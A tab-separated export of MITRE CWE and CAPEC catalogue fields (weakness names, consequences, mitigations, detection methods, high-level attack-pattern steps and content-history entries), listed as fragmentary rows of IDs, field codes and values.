20018	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
15938	35	MITRE
10823	39	2008-09-08
14385	85	583
18512	28	CWE Content Team
16360	26	Architecture and Design
7835	35	MITRE
23404	100	The MITRE Corporation
18521	102	ChildOf
25119	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
24928	74	1
7467	57	Indirect
8271	71	2012
12182	62	updated References
15920	21	CWE Content Team
21637	69	Draft
21266	28	CWE Content Team
23060	28	CWE Content Team
20730	92	Exploit
12765	35	MITRE
18371	92	Experiment
16982	79	Confidentiality
7698	100	The MITRE Corporation
14842	39	2011-06-27
21962	28	CWE Content Team
14198	56	ChildOf
23501	63	Execute Unauthorized Code or Commands
15882	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
6232	103	Primary
20423	28	CWE Content Team
10100	39	2012-10-30
9830	43	Simple
13245	78	Low
15051	31	1000
20076	28	CWE Content Team
18934	86	http://blogs.sans.org/appsecstreetfighter/2010/02/26/top-25-series-rank-10-missing-encryption-of-sensitive-data/
23035	103	Primary
15315	101	CAPEC Content Team
17033	53	The MITRE Corporation
13691	56	CanPrecede
11103	59	Updated Related_Weaknesses
17832	79	Availability
19071	40	A web server that supports server side includes and has them enabled
21220	28	CWE Content Team
10990	62	updated Relationships
14645	92	Experiment
7834	35	MITRE
6791	35	MITRE
13128	59	Updated Related_Attack_Patterns
23738	45	Base
16130	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
23069	28	CWE Content Team
23239	50	Curtail unexpected input.
22708	39	2008-09-08
12851	69	Incomplete
11899	62	updated Related_Attack_Patterns, Taxonomy_Mappings
11179	73	An attacker can use the filter failure to introduce malicious data into the system and leverage a subsequent SQL injection, Cross Site Scripting, Command Injection or similar weakness if it exists.
9915	25	Medium
23144	42	Avoid using cookie data for a security-related decision.
17289	35	MITRE
15521	28	CWE Content Team
17110	39	2011-03-29
6246	35	MITRE
17246	53	The MITRE Corporation
13639	26	Operation
11528	102	ChildOf
7547	72	There is the potential for arbitrary code execution with privileges of the vulnerable program.
10017	49	2012
23752	62	updated Description
25138	53	The MITRE Corporation
9884	76	2017-08-04
5911	28	CWE Content Team
6940	28	CWE Content Team
21608	95	[Craft a clickjacking page] The adversary utilizes web page layering techniques to try to craft a malicious clickjacking page
24287	21	CLASP
22657	23	The application uses deployed components from application servers, but it also uses low-level functions/methods for management of resources, instead of the API provided by the application server.
23516	91	Implementation
19109	57	Primary
13775	28	CWE Content Team
24743	28	CWE Content Team
19725	48	11
17288	31	1003
9998	39	2008-10-14
19673	73	Spider web sites for all available links
20897	57	Primary
9137	47	Gain Privileges
7622	100	The MITRE Corporation
11998	78	High
14316	72	A Divide by Zero results in a crash.
15460	78	Low
15267	39	2009-07-27
15773	26	Operation
24126	35	MITRE
6770	35	MITRE
8081	62	updated Common_Consequences
7572	99	Wikipedia
17803	50	Exchange public keys using a secure channel
16957	35	MITRE
11520	39	2011-06-01
6500	91	Architecture and Design
7516	50	Assess software during development and prior to deployment to ensure that it functions as intended and without any malicious functionality.
11617	102	ChildOf
22815	39	2017-05-03
11453	63	Bypass Protection Mechanism
24447	57	Primary
7312	33	Michael Gegick
7868	31	1000
10979	62	updated Applicable_Platforms, References
11598	35	MITRE
18016	26	Architecture and Design
22473	63	Modify Application Data
21199	86	http://www.rtfm.com/openssl-examples/part1.pdf
24469	56	ChildOf
19175	35	MITRE
13913	53	The MITRE Corporation
7953	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
6131	26	Implementation
16658	62	updated Demonstrative_Examples
17671	35	MITRE
22825	62	updated Demonstrative_Examples
23942	39	2017-05-03
9662	78	Low
23042	40	The communication channel between the client and the server is not secured via channel security such as TLS
19665	45	Base
18503	63	Varies by Context
8565	39	2014-06-23
6462	62	updated Common_Consequences
19403	62	updated Relationships
14298	39	2008-09-08
22709	28	CWE Content Team
24445	73	Sniff cookie using a network sniffer such as Wireshark
8900	35	MITRE
12850	62	updated Relationships, Taxonomy_Mappings
12137	81	Other
25169	91	Implementation
19874	88	Improper Handling of Length Parameter Inconsistency
7966	103	Primary
16757	91	Implementation
14485	53	The MITRE Corporation
19572	62	updated Demonstrative_Examples, Relationships
23857	62	updated Relationships
7860	62	updated Potential_Mitigations
23434	51	2014-06-23
22706	44	High
6390	50	Implementation: Ensure all configuration files and resource are either removed or protected when promoting code into production.
7650	100	The MITRE Corporation
11597	22	09
20758	28	Eric Dalci
6007	85	135
18520	52	Automated techniques can find areas where path traversal weaknesses exist. However, tuning or customization may be required to remove or de-prioritize path-traversal problems that are only exploitable by the software's administrator - or other privileged users - and thus potentially valid behavior or, at worst, a bug instead of a vulnerability.
22006	79	Authorization
6996	96	2018-07-02
8873	62	updated Time_of_Introduction
9021	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
23809	28	CWE Content Team
22039	79	Availability
11416	62	updated Observed_Examples
24435	40	A DNS cache must be vulnerable to some attack that allows the adversary to replace addresses in its lookup table.Client applications must trust the corrupted cashed values and utilize them for their domain name resolutions.
22512	101	CAPEC Content Team
20556	35	MITRE
23439	62	updated Potential_Mitigations
8689	28	CWE Content Team
13456	73	Post a malicious HTTP Request utilizing double Content-Length headers to cause request splitting
20790	28	CWE Content Team
15056	47	Modify Data
15747	103	Primary
11348	38	An attacker creating or modifying Symbolic links is a potential signal of attack in progress.
24665	35	MITRE
9997	101	CAPEC Content Team
6168	39	2012-05-11
6083	32	Addison-Wesley
18726	35	Cigital
16322	62	updated Demonstrative_Examples
19607	35	MITRE
18145	56	ChildOf
20497	62	updated Relationships
20388	28	CWE Content Team
23263	61	Stable
20383	39	2017-11-08
7023	69	Incomplete
10983	39	2010-02-16
9424	39	2019-01-03
14950	103	Primary
24296	35	MITRE
21266	62	updated Relationships
17077	43	Simple
12703	50	Configuration: Disable Java Script in the browser
24257	28	Eric Dalci
11866	31	1000
12537	62	updated Potential_Mitigations
16857	53	The MITRE Corporation
16869	62	updated Applicable_Platforms, Modes_of_Introduction, References, Relationships
15490	89	Detailed
9234	79	Authorization
22721	77	Automated Static Analysis - Source Code
14464	103	Primary
23470	43	Simple
14047	39	2014-06-23
10717	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings
20581	35	MITRE
14508	57	Indirect
19021	69	Draft
7180	39	2017-11-08
6460	76	2017-01-09
17422	21	CWE Content Team
24421	35	MITRE
16294	44	SOAR Partial
15370	28	CWE Content Team
12053	35	MITRE
15371	51	2014-06-23
13888	62	updated Relationships
24113	78	High
20804	63	Other
7610	35	MITRE
22450	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Context-configured Source Code Weakness Analyzer
14604	81	Other
24431	39	2009-07-17
24377	100	The MITRE Corporation
19841	77	Manual Static Analysis - Source Code
15042	50	Implementation: Ensure the web server implements all relevant security patches, many exploitable buffer overflows are fixed in patches issued for the software.
17817	35	MITRE
10387	62	updated Relationships
22094	88	Improper Handling of Syntactically Invalid Structure
12831	91	Architecture and Design
10999	79	Confidentiality
16747	26	Architecture and Design
20048	39	2008-10-14
17168	96	2018-07-02
17913	59	Updated Related_Attack_Patterns
8401	69	Draft
23965	25	High
18987	46	The purpose of package scope is to prevent accidental access by other parts of a program. This is an ease-of-software-development feature but not a security feature.
17541	40	TCP Window scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.
21439	91	Testing
12694	101	CAPEC Content Team
6358	101	CAPEC Content Team
11733	100	The MITRE Corporation
23045	28	CWE Content Team
9864	62	updated Relationships
6527	62	updated Time_of_Introduction
24189	91	System Configuration
18987	23	Java packages are not inherently closed; therefore, relying on them for code security is not a good practice.
17282	56	ChildOf
12895	40	The server must assume that the queries it receives follow specific templates and/or have fields or attributes that follow specific procedures. The server must process queries that it receives without adequately checking or sanitizing queries to ensure they follow these templates.
16085	56	ChildOf
9912	62	updated Time_of_Introduction
13977	73	Create a symbolic link and ensure that it works as expected on the given platform.
18516	28	CWE Content Team
15628	35	MITRE
7754	35	MITRE
5840	31	1000
23007	28	CWE Content Team
11809	63	Read Files or Directories
12417	62	updated Common_Consequences
19364	47	Gain Privileges
10440	45	Base
21899	35	MITRE
9376	92	Exploit
5865	27	None: No specialized resources are required to execute this type of attack. The attacker may need to be able to serve the injected Flash content.
11348	50	Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.
14349	59	Updated Related_Attack_Patterns
7266	43	Simple
6551	21	PLOVER
20689	43	Simple
17622	93	Limited
10673	35	MITRE
9301	56	ChildOf
14794	40	The target application must have a pointer variable that the attacker can influence to hold an arbitrary value.
24541	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
16766	45	Base
8831	31	1000
6806	68	Note that this can be bypassed using XSS (CWE-79).
24714	81	Integrity
8302	56	ChildOf
15023	39	2012-05-11
7811	50	Implementation: Normalize, filter and white list any input that will be included in any subsequent web pages or back end operations.
11979	35	MITRE
17337	33	Joshbw
10046	27	Rainbow table of password hash chains with the right algorithm used. A password cracking tool that leverages this rainbow table will also be required. Hash(es) of the password is required.
10193	50	Implementation: Normalize, filter and white list all input including that which is not expected to have any scripting content.
13223	96	2018-12-21
19404	62	updated Potential_Mitigations
6557	62	updated Other_Notes, Relationship_Notes
21962	39	2014-06-23
17423	39	2012-05-11
9401	53	The MITRE Corporation
8997	27	None: No specialized resources are required to execute this type of attack.
18848	42	Carefully check each input parameter against a rigorous positive specification (whitelist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.
13507	27	A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.
9120	79	Confidentiality
6334	76	2017-05-01
12636	40	The adversary requires the ability to craft custom TCP ACK segments for use during network reconnaissance. Sending an ACK ping requires the ability to access "raw sockets" in order to create the packets with direct access to the packet header.
7927	28	CWE Content Team
24311	62	updated Relationships
17640	39	2010-04-05
16234	63	DoS: Crash, Exit, or Restart
13622	39	2019-09-19
12419	92	Explore
9080	28	CWE Content Team
19223	36	http://projects.webappsec.org/Fingerprinting
24965	63	Quality Degradation
9566	42	Minimize the usage of shared resources in order to remove as much complexity as possible from the control flow and to reduce the likelihood of unexpected conditions occurring.                   Additionally, this will minimize the amount of synchronization necessary and may even help to reduce the likelihood of a denial of service where an attacker may be able to repeatedly trigger a critical section (CWE-400).
7931	35	MITRE
13157	62	updated Demonstrative_Examples, Relationships
15027	23	An adversary installs and executes malicious code on the target system in an effort to achieve a negative technical impact. Examples include rootkits, ransomware, spyware, adware, and others.
22142	89	Detailed
8739	61	Draft
14962	55	CAPEC Content Team
8231	24	MITRE
15339	91	Implementation
19832	73	Inject context-appropriate malicious file system control syntax
22907	62	updated Related_Attack_Patterns
12610	51	2014-06-23
5982	63	Other
21816	39	2019-01-03
22229	35	MITRE
20078	81	Integrity
21278	47	Bypass Protection Mechanism
8608	103	Primary
21191	91	Implementation
23092	42	Use a language that provides appropriate memory abstractions.
15335	101	CAPEC Content Team
10867	104	601
12371	28	CWE Content Team
18022	47	Execute Unauthorized Commands
8404	59	Updated Attack_Phases
21335	39	2010-04-05
5618	76	2015-12-07
16814	81	Confidentiality
24082	28	CWE Content Team
19379	28	CWE Content Team
13300	69	Incomplete
5842	27	The attacker must be able to force the Flash overlay over the decoy content.
10050	56	ChildOf
22540	86	http://blogs.sans.org/appsecstreetfighter/2010/03/09/top-25-series-rank-7-path-traversal/
22820	100	The MITRE Corporation
13629	35	MITRE
18024	35	MITRE
19409	80	To identify vulnerable configuration files, and understand how to manipulate servers and erase forensic evidence
13879	63	Gain Privileges or Assume Identity
11588	70	CESA-2007-002 - rev 2: Sun JDK6 breaks XXE attack protection
16176	91	Implementation
14885	28	CWE Content Team
12668	43	Simple
6349	69	Draft
17785	39	2015-12-07
19695	102	ChildOf
24113	89	Detailed
15460	97	Cellular Jamming
24799	94	Denial of Service
7595	31	1000
9935	101	CAPEC Content Team
18839	39	2012-10-30
9556	77	Architecture or Design Review
14214	97	XML Nested Payloads
10373	35	MITRE
11923	62	updated Taxonomy_Mappings
9773	35	MITRE
17738	33	Johannes Ullrich
21126	104	73
5792	56	ChildOf
18137	50	Design: Perform validation on email header data
6661	39	2014-07-30
8670	62	updated Description
22685	39	2011-09-13
24692	62	updated Taxonomy_Mappings
9770	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
21775	39	2014-06-23
8342	35	MITRE
17196	28	CWE Content Team
9346	50	Make sure that your program or service fail safely. What happen if the communication protocol is interrupted suddenly? What happen if a parameter is missing? Does your system have resistance and resilience to attack? Fail safely when a resource exhaustion occurs.
13472	96	2009-06-30
20414	39	2008-09-08
8929	28	CWE Content Team
7000	39	2008-11-24
12414	63	Other
7269	88	Cloneable Class Containing Sensitive Information
9302	62	updated Relationships
13426	43	Simple
23811	104	69
8060	50	Ensure that the system is Unicode aware and can properly process Unicode data. Do not make an assumption that data will be in ASCII.
11050	28	CWE Content Team
7901	40	Direct access to the object or software.
18782	70	Ten Security Checks for PHP, Part 1
17259	28	CWE Content Team
21495	47	Read Data
8525	28	CWE Content Team
7074	31	1000
18120	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
23319	91	Implementation
11960	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
19977	43	Simple
16299	76	2017-05-01
9133	62	updated Observed_Examples, Relationships
23003	63	Other
20348	35	MITRE
22949	62	updated Common_Consequences
7641	72	An attacker may be able to gain privileges.
14330	94	Run Arbitrary Code
6385	21	7 Pernicious Kingdoms
14912	39	2012-10-30
12043	62	updated Description
22029	35	MITRE
21126	45	Class
15205	35	MITRE
12642	63	DoS: Instability
9551	72	Messages sent with a capture-relay attack allow access to resources which are not otherwise accessible without proper authentication.
24124	23	The program defines a signal handler that calls a non-reentrant function.
21100	39	2013-02-21
25029	62	updated Related_Attack_Patterns
16991	81	Confidentiality
9777	35	MITRE
16923	28	CWE Content Team
15149	35	MITRE
11323	62	updated Relationships, Taxonomy_Mappings
21835	35	MITRE
17214	35	MITRE
17323	103	Primary
20630	51	2014-06-23
21641	39	2011-06-01
24347	95	The attacker communicates with the application server using a thin client (browser) or thick client.
10421	103	Primary
20691	77	Automated Static Analysis - Binary or Bytecode
15040	35	MITRE
14068	35	MITRE
16480	100	The MITRE Corporation
21993	28	CWE Content Team
18640	26	Implementation
14859	103	Primary
12266	103	Primary
21192	28	CWE Content Team
11764	35	MITRE
22900	88	Processor Optimization Removal or Modification of Security-critical Code
21518	62	updated References
12259	27	None: No specialized resources are required to execute this type of attack.
16549	35	MITRE
13246	62	updated Relationships
6122	31	1000
9238	90	Language-Independent
6338	59	Updated References
14072	28	Eric Dalci
20817	23	The Android application uses an implicit intent for transmitting sensitive data to other applications.
15516	39	2014-02-18
20075	80	To reverse engineer the client-side code to disable/remove the functionality on the client that the server relies on.
24072	74	1
20298	54	Medium
19983	81	Access Control
8226	28	CWE Content Team
13604	76	2017-05-01
18230	56	ChildOf
10195	28	CWE Content Team
10069	85	263
15896	62	updated Relationships, Taxonomy_Mappings
22220	62	updated Demonstrative_Examples
16847	77	Automated Static Analysis - Source Code
12497	26	Architecture and Design
17997	39	2008-07-01
11275	96	2012-12-28
19701	35	MITRE
24662	49	2010
21906	62	updated Description, Name
23147	28	CWE Content Team
11209	95	[Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.
21657	67	High
13083	101	CAPEC Content Team
11259	81	Integrity
9951	80	To use misclassification to force the Web server to disclose configuration information, source, or binary data
15388	39	2008-07-01
6696	42	Run or compile your software with settings that generate warnings about uninitialized variables or data.
23753	91	Implementation
6833	33	Crosby
21083	91	Operation
18847	90	Language-Independent
10039	72	This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or allowing attackers to execute arbitrary code.
22582	47	Modify Data
9990	62	updated Type
9027	89	Standard
8172	35	Cigital
18801	26	Implementation
16682	72	If the untrusted pointer references a memory location that is not accessible to the program, or points to a location that is "malformed" or larger than expected by a read or write operation, the application may terminate unexpectedly.
16506	72	By reading out-of-bounds memory, an attacker might be able to get secret values, such as memory addresses, which can be bypass protection mechanisms such as ASLR in order to improve the reliability and likelihood of exploiting a separate weakness to achieve code execution instead of just denial of service.
17998	62	updated Name
20706	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When accessing a user-controlled array index, use a stringent range of values that are within the target array. Make sure that you do not allow negative values to be used. That is, verify the minimum as well as the maximum of the range of acceptable values.
22883	45	Variant
15431	63	Other
11032	35	MITRE
23889	28	CWE Content Team
19330	35	MITRE
13624	23	The program copies an input buffer to an output buffer without verifying that the size of the input buffer is less than the size of the output buffer, leading to a buffer overflow.
8869	76	2017-01-09
16945	35	MITRE
8430	21	PLOVER
24761	21	CWE Content Team
7727	39	2014-07-30
9597	79	Availability
8725	28	CWE Content Team
22757	39	2011-06-27
8751	35	MITRE
24957	90	Java
12660	39	2012-05-11
8632	35	MITRE
15866	31	1000
12599	35	MITRE
18149	31	1000
14848	28	CWE Content Team
20156	21	Evgeny Lebanidze
8249	97	TCP Null Scan
20887	104	127
16137	39	2017-11-08
24304	28	CWE Content Team
19141	62	updated Potential_Mitigations
11016	39	2008-09-08
19989	86	http://j00ru.vexillium.org/dump/zn_slides.pdf
6508	62	updated Relationships
12083	62	updated Potential_Mitigations, Time_of_Introduction
16510	62	updated Relationships
14434	35	MITRE
11679	63	Unexpected State
22008	79	Authorization
20569	27	Ability to issue GET / POST requests cross domain
18725	56	ChildOf
17406	62	updated Relationships, Taxonomy_Mappings
21713	73	Try multiple fuzzing techniques to list directory contents for directories that will not reveal their contents with a "/" request
10111	54	Medium
10900	39	2011-06-01
17483	42	The choice could be made to use a language that is not susceptible to these issues.
25015	39	2011-06-27
22963	101	CAPEC Content Team
10493	62	updated Applicable_Platforms, Modes_of_Introduction, References, Relationships
10376	91	Operation
21762	39	2008-09-08
21365	28	CWE Content Team
20063	35	MITRE
13314	28	Eric Dalci
20256	62	updated Description
12713	69	Stable
16903	35	MITRE
21135	91	Architecture and Design
16778	49	2006
19867	56	ChildOf
23691	91	Testing
20653	100	The MITRE Corporation
19881	62	updated Other_Notes, Research_Gaps
23478	39	2018-03-27
22966	51	2014-06-23
18237	56	CanPrecede
12733	90	Language-Independent
21686	31	700
23366	76	2017-08-04
5721	56	ChildOf
17492	39	2009-10-29
15319	35	MITRE
9160	31	699
21353	39	2008-07-01
12970	35	MITRE
5971	28	CWE Content Team
12973	62	updated Common_Consequences
12789	31	699
15511	39	2012-10-30
10997	103	Primary
11704	56	ChildOf
14594	92	Explore
8536	28	CWE Content Team
7832	91	Architecture and Design
22954	102	ChildOf
25165	63	Gain Privileges or Assume Identity
9183	31	1003
14525	35	MITRE
9224	48	02
12203	55	CAPEC Content Team
6027	62	updated References, Relationships, Taxonomy_Mappings
16850	33	RSnake
15677	35	MITRE
20099	39	2017-01-19
22233	91	Operation
10363	76	2015-12-07
12455	28	CWE Content Team
20256	28	CWE Content Team
12929	39	2014-07-30
17832	94	Run Arbitrary Code
10179	79	Authorization
23085	35	MITRE
6258	73	The attacker injects context-appropriate malicious file system control syntax to access the content of the targeted file.
20158	39	2009-07-27
17385	80	Although fuzzing parameters is not difficult, and often possible with automated fuzzing tools, interpreting the error conditions and modifying the parameters so as to move further in the process of mapping the application requires detailed knowledge of target platform, the languages and packages used as well as software design.
19103	56	CanPrecede
20005	39	2010-06-21
18654	28	CWE Content Team
17181	59	Updated Taxonomy_Mappings
12978	50	Access to the directories should be restricted as to prevent attackers from manipulating the files. Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file.
19730	28	CWE Content Team
12349	35	MITRE
14473	28	Eric Dalci
16723	103	Primary
15871	56	ChildOf
8434	28	CWE Content Team
13485	56	CanPrecede
9691	104	296
22749	103	Primary
9873	88	Information Exposure Through Comments
22133	48	05
24669	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Fuzz Tester                            Framework-based Fuzzer
14769	39	2009-07-27
25090	88	Insufficiently Protected Credentials
18773	26	Architecture and Design
15654	62	updated Relationships, Other_Notes, Taxonomy_Mappings
14087	24	MITRE
19500	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
17918	62	updated Applicable_Platforms, Relationships, Observed_Example
15669	39	2010-02-16
7876	74	3
15198	43	Simple
19071	54	High
7908	69	Draft
11803	39	2017-11-08
10947	57	Indirect
16338	35	MITRE
25198	86	http://seclists.org/fulldisclosure/2006/Feb/0040.html
21417	96	2014-01-14
11151	45	Variant
14823	90	Language-Independent
6369	62	updated Relationships
15030	39	2009-03-10
14843	55	CAPEC Content Team
18507	40	Insufficient input validation in application to check for input sanity before using it as part of response header
20412	27	Ability to send HTTP post to scripting host and collect output
19506	70	XSS vulnerabilities in Google.com
15193	28	CWE Content Team
8242	28	CWE Content Team
10139	88	Excessively Deep Nesting
12922	28	CWE Content Team
13704	28	CWE Content Team
8165	35	MITRE
22403	50	Assurance: Sanitize the code of the standard libraries to make sure there is no security weaknesses in them.
7659	28	CWE Content Team
17539	39	2012-05-11
16499	45	Base
14769	35	MITRE
17285	62	updated Applicable_Platforms, Modes_of_Introduction, References, Relationships
11520	62	updated Common_Consequences
17062	79	Confidentiality
24167	39	2017-01-19
20895	39	2011-03-29
18039	62	updated Modes_of_Introduction, References, Relationships
21400	28	CWE Content Team
17026	47	Modify Data
12160	27	Transaction generator(s)/source(s) and ability to cause arrival of messages at the target with sufficient rapidity to overload target. Larger targets may be able to handle large volumes of requests so the attacker may require significant resources (such as a distributed network) to affect the target. However, the resources required of the attacker would be less than in the case of a simple flooding attack against the same target.
23128	62	updated Common_Consequences
15252	35	MITRE
17817	39	2017-05-03
24034	35	MITRE
19865	62	updated Related_Attack_Patterns, Relationships
25265	39	2012-10-30
20733	39	2010-02-16
10994	62	updated Relationships
14041	63	Quality Degradation
6754	26	Implementation
20097	56	ChildOf
12035	39	2012-10-30
5981	73	Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.
21460	23	An attacker with access to download and update system software sends a maliciously altered BIOS to the victim or victim supplier/integrator, which when installed allows for future exploitation.
6615	39	2010-02-16
23527	81	Other
7473	35	MITRE
22173	28	CWE Content Team
19935	69	Draft
10948	85	420
14359	35	MITRE
21358	62	updated Time_of_Introduction
22495	45	Base
21949	39	2012-05-11
9228	45	Base
9289	39	2010-02-16
10642	74	2
13465	28	CWE Content Team
11837	31	1000
18462	28	Eric Dalci
21310	69	Draft
9718	35	MITRE
19432	35	MITRE
12909	42	Clearly specify which data or resources are valuable enough that they should be protected by encryption. Require that any transmission or storage of this data/resource should use well-vetted encryption algorithms.
16369	81	Confidentiality
17456	39	2008-10-14
11195	35	MITRE
20490	28	CWE Content Team
12214	80	This attack requires advanced cyber capabilities
18045	23	The software identifies an error condition and creates its own diagnostic or error messages that contain sensitive information.
18005	28	CWE Content Team
25369	58	An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.
7580	91	Architecture and Design
19823	25	Low
18292	33	Kenneth Ballard
24528	39	2008-09-08
15631	28	CWE Content Team
11511	77	Manual Analysis
19152	50	Remove potentially sensitive information that is not necessary for the application's functionality.
7701	101	CAPEC Content Team
21432	79	Availability
25188	62	updated Maintenance_Notes, Relationships, Taxonomy_Mappings
24099	28	CWE Content Team
6666	62	updated Demonstrative_Examples, Description, Other_Notes
19374	103	Primary
20026	103	Primary
14338	55	CAPEC Content Team
15396	39	2011-06-01
10074	79	Access Control
23089	28	CWE Content Team
21404	102	ChildOf
24049	70	Wikipedia
21277	80	Ability to craft a CSS injection
13536	62	updated Description, Relationships, Observed_Example, Taxonomy_Mappings
18205	103	Primary
14359	28	CWE Content Team
25177	35	MITRE
9750	62	updated Related_Attack_Patterns, Relationships
15776	61	Stable
13779	62	updated Demonstrative_Examples, Observed_Examples
6471	50	Use an abstraction library to abstract away risky APIs. Not a complete solution.
10098	35	MITRE
13322	43	Simple
16327	88	Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking
15216	62	updated Relationships
14073	39	2008-07-01
11236	90	Language-Independent
17135	39	2012-05-11
17203	39	2017-11-08
6981	39	2008-08-01
19320	43	Simple
6259	28	CWE Content Team
19273	97	Removing Important Client Functionality
13567	102	ChildOf
10647	62	updated Relationships
23502	62	updated Applicable_Platforms
15853	39	2011-09-13
25194	63	Execute Unauthorized Code or Commands
19418	53	The MITRE Corporation
18952	100	The MITRE Corporation
18625	86	http://www.cs.bham.ac.uk/~garciaf/publications/spinner.pdf
24789	26	Operation
17861	28	CWE Content Team
17798	31	699
17928	46	A J2EE application can make use of multiple JVMs in order to improve application reliability and performance. In order to make the multiple JVMs appear as a single application to the end user, the J2EE container can replicate an HttpSession object across multiple JVMs so that if one JVM becomes unavailable another can step in and take its place without disrupting the flow of the application. This is only possible if all session data is serializable, allowing the session to be duplicated between the JVMs.
10575	26	Architecture and Design
19510	39	2019-06-20
17809	76	2019-09-30
12405	35	MITRE
8681	28	CWE Content Team
24983	62	updated Relationships
19430	62	updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings
17378	40	The adversary must have the means and knowledge of how to communicate with the target in some manner.
7978	90	Java
20478	28	CWE Content Team
16947	35	MITRE
8636	89	Detailed
8459	86	http://www.felinemenace.org/~mercy/papers/UBehavior/UBehavior.zip
21928	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
22339	23	An adversary intercepts a form of communication (e.g. text, audio, video) by way of software (e.g., microphone and audio recording application), hardware (e.g., recording equipment), or physical means (e.g., physical proximity). The goal of eavesdropping is typically to gain unauthorized access to sensitive information about the target for financial, personal, political, or other gains. Eavesdropping is different from a sniffing attack as it does not take place on a network-based communication channel (e.g., IP traffic). Instead, it entails listening in on the raw audio source of a conversation between two or more parties.
17706	28	CWE Content Team
8362	28	CWE Content Team
13410	103	Primary
24957	104	105
12765	39	2014-07-30
18730	89	Meta
11193	88	Insufficient Encapsulation
8405	28	Eric Dalci
11880	43	Simple
18964	42	Design objects and program flow such that multiple or complex casts are unnecessary
13537	61	Draft
7272	81	Integrity
7902	103	Primary
14156	74	4
20127	91	Implementation
9278	39	2012-10-30
19828	100	The MITRE Corporation
5993	72	If the expired pointer references a memory location that is not accessible to the program, or points to a location that is "malformed" (such as NULL) or larger than expected by a read or write operation, then a crash may occur.
10857	45	Base
23977	28	CWE Content Team
25364	39	2010-12-13
22684	79	Access Control
5927	71	2008
11503	47	Resource Consumption
18317	35	MITRE
13543	86	http://developer.android.com/training/articles/security-tips.html#StoringData
14029	52	The characterizaton of sensitive data often requires domain-specific understanding, so manual methods are useful. However, manual efforts might not achieve desired code coverage within limited time constraints. Black box methods may produce artifacts (e.g. stored data or unencrypted network transfer) that require manual evaluation.
15069	26	Operation
20283	56	ChildOf
16580	100	The MITRE Corporation
17312	67	High
22878	35	MITRE
18392	62	updated Demonstrative_Examples
17051	103	Primary
